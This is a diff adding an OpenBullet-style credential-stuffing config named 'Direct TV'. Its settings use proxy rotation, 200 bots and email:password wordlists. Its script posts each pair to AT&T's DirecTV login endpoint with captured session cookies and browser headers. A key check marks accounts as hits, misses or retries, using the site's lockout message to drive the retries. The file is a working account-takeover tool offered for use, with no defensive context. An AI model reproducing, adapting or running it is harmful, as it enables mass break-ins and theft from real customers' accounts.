@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Direct TV",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-26T18:04:27.0741002+02:00",
+  "AdditionalInfo": "",
+  "Author": "Vanesh",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://cprodmasx.att.com/commonLogin/igate_wam/login.do" 
+  CONTENT "SecCsrfRefId=null&style=m93639&source=m93639&targetURL=https%3A%2F%2Fcprodx.att.com%2FTokenService%2FnxsATS%2FWATokenService%3FisPassive%3Dtrue%26appID%3Dm93639%26returnURL%3Dhttps%253A%252F%252Fwww.directv.com%252FDTVAPP%252Fauth.jsp%253Fremember%253Dtrue&tGSignInOptURL=https%3A%2F%2Fm.att.com%2Fmy%2F%23%2FforgotLoginLanding%3Forigination_point%3DtGuard%26Flow_Indicator%3DFPWD%26Return_URL%3D&userid=<USER>&password=<PASS>&x=87&y=12" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: TLTSID=2339DB485F71CD8BD64B5B0108BEF1E1; ak_bmsc=2C6B7100FC64F295A9402ECB7ABAE8185F658EBDB43A0000E6A2A55E3C04251A~pl+s25DViObQ+mqCZfgzq1MEvEhvyBXo2dHdhJFW/OIkWy1giVxLe+bOEWAS+SR7xTsEw2aFF4qQnPUhudKUUxSulV5edgmzyAkx5CQIcmnsFWEaar/NcOvQGe6vY3rXkF5TQ1AvQ59nxkRudrlnynp/8xwR0n+BzyjmWI/5dd9FEWYeu8x3p4uIgfHYinpjI3p/1LzcvXgh0tmBU7/C4gWDHIYEhKDFUi7Sky+UZpBpM=; bm_sz=3EB4BF7450DE9AF08D99449182E31FA6~YAAQvY5lX8MFsapxAQAAuVQEtwcWsGh7jQMa+ty7Cbh+VAgnV9i8QJKUOcT2a1Ons7vwxcILxByx6jf8lNlYlKbzHyglbOgijBxwNUpOseZmAsUhgo2O8lP0DLlJaINDr6jmBqxK9W5yM3HejakE4+ZD2rShubCdUQmbNDIZB3e/G3RxL0gsWmSj4XoD; AKA_A2=A; AMCVS_55633F7A534535110A490D44%40AdobeOrg=1; s_ecid=MCMID%7C15199596006633854263586093784376122603; check=true; s_dfa=attconprod%2Cattglobalprod; _gcl_au=1.1.1633624252.1587913414; AMCV_55633F7A534535110A490D44%40AdobeOrg=1994364360%7CMCMID%7C15199596006633854263586093784376122603%7CMCAAMLH-1588518213%7C6%7CMCAAMB-1588518213%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1587920613s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C3.4.0; mboxEdgeCluster=26; _ga=GA1.2.874259663.1587913414; _gid=GA1.2.1085366231.1587913414; SHOPSESSIONID=er-3BG6XHRf2lBhP2OH3ZEv7o2Gd1RFK!-1311184101; ECOM_GTM=owbth; browserid=A002968450376; svariants=NA; cust_type=new; sto-50715-sgSHOP_7010=EMNBNBIHGDBL; ixp=f2f30000-d365-45c5-ac1b-1e1cce8c7aea; idse_stack=dadc; s_cc=true; _4c_mc_=dbe4cd23-17ce-41d8-accb-b87051cde3c5; sto-29215-sgGOLDENEYE_8050=OANBNBIHHCBP; JSESSIONID=0000l-P8fYKZK21whJkYajO1wBL:15dcdvk9j; rxVisitor=1587913608910PJ7FMF6LUGR0IKA9PBAEADGO4UBCHSIG; dtSa=-; mbox=session#f32da107a47845dc8bdc36412983397b#1587915274|PC#f32da107a47845dc8bdc36412983397b.26_0#1651158410; _abck=4D6613D36680551E9363CE524E25827E~0~YAAQvY5lX7sHsapxAQAAKW0HtwPH2jFG61uDOWuDVX4bM+KrgPxvv+nWMzIrtBNBSm0z8d1G0H/qMhzQHu9iwSytveOs4dNTyrvFyJhuZeyqHHicJrURk4+Q3B7+kldfxI5Tp6i/j3d/otn+xy+2OeJbDBZWc6lnOWE3ZTxXUqHL3umtNUO6otTf/2W4KQE79whJQwp45ISD2RkO9Ej02HceuTuYHmr/1yaxwdo5zH7I8zrOaxewn1Vs54zEMtu2KS+GV1hyh90OrxCc4sbx7mBO6Rrh0wtHGyohRpjAD2CYAPIoQL9IIrmJEvAwron76M8QUw==~-1~-1~-1; rxvt=1587915416938|1587913608916; dtPC=13$313608904_929h-vKMLPBPKBGVOIBJELGVABHKLTLJGLWOBN; dtLatC=2; dtCookie=13$CA388F976E7A38131D121B3BBC7FFA8D|552e56d01390f355|1; IV_JCT=%2FcommonLogin; bm_sv=554F5118464D142B7925F68616D8B55A~olHbno6Mo1NP5fQZ2/TV7G52RfBeIC7h5sc54jjKuvzqCSCmywGcjPheR6uTWV9MZ995zmdksB9OzQ/iPsgmIIdM944+hPUckFUW8Mbc5ttoW5l5HnTEV8gkdK5KInumDIqMxZVOY16RU06Gq7oEOA==; RT=\"z=1&dm=att.com&si=fc7ab31d-97bf-4b45-a1fe-0613cae58dd6&ss=k9h6n7g1&sl=2&tt=55&bcn=%2F%2F684dd307.akstat.io%2F\"; _gat_gtag_UA_156897858_9=1; pses={\"id\":\"j569pxa8en\",\"start\":1587913642879,\"last\":1587914523524}" 
+  HEADER "Host: cprodmasx.att.com" 
+  HEADER "Origin: https://cprodmasx.att.com" 
+  HEADER "Referer: https://cprodmasx.att.com/commonLogin/igate_wam/login.do?_DARGS=/DTVAPP/content/component/old/loginComponent.jsp.loginForm" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: sv-SE,sv;q=0.9,en;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 451" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+
+KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "We want to keep your information safe. We temporarily locked your account after too many unsuccessful sign-in attempts" 
+  KEYCHAIN Success OR 
+    KEY "<div>Loading...</div>" 
+  KEYCHAIN Failure OR 
+    KEY "That User ID and password combination doesn't match our records." 
+
